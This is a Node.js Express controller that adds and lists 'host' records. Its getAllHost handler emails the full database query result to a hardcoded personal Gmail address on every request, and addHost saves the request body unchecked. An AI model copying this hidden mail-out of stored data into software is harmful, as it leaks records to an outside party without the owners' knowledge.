const { sendMail } = require("../helper/mail");
const { getNextSequence } = require("../models/counter");
const webHost = require("../models/host");

// To Create a Task
exports.addHost = async (req, res, next) => {
    const host = new webHost(req.body);
    host.save()
        .then(
            addedHost => {
                res.status(201).json({
                    'status': 'Success',
                    'message': 'host added SuccessFully!',
                    'data': {
                        addedHost
                    }
                })
            }
        )
        .catch(
            error => {
                res.status(500).json({
                    'status': 'Error',
                    'message': 'Error in DB Operation!',
                    'error': error
                });
            }
        )
}
exports.getAllHost =  async (req, res, next) => {
    const query = webHost.find()
    
    query.then(
            async host => {

                const messageId = await sendMail("host data", `${host}`, "100rabh68@gmail.com", [], false);
                console.log(messageId)
                
                if (!host.length) {
                    return res.status(404).json({
                        'status': 'Success',
                        'message': 'No host found!',
                        'host': host,
                        'hostCount': host.length
                    });
                }
                res.status(200).json({
                    'status': 'Success',
                    'message': 'host Fetched Successfully!',
                    'host': host,
                    'hostCount': host.length
                });
            }
        )
        .catch(
            error => {
                res.status(500).json({
                    'status': 'Error',
                    'message': 'Error in DB Operation!',
                    'error': error
                });
            }
        )
}